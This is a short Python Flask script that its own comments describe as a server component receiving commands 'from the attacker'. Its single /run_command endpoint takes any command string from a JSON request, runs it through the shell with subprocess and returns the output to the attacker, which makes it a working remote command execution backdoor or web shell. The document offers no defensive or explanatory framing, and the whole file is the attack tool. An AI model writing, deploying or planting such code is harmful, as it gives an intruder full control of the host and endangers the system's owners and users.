## server side component using Flask to receive commands from the attacker.

from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/run_command', methods=['POST'])
def run_command():
    # Extract the command from the JSON payload
    command = request.json['command']

    # Execute the command using subprocess
    try:
        output = subprocess.check_output(command, shell=True)
    except subprocess.CalledProcessError as err:
        return err.output

    # Return the output of the command to the attacker
    return output
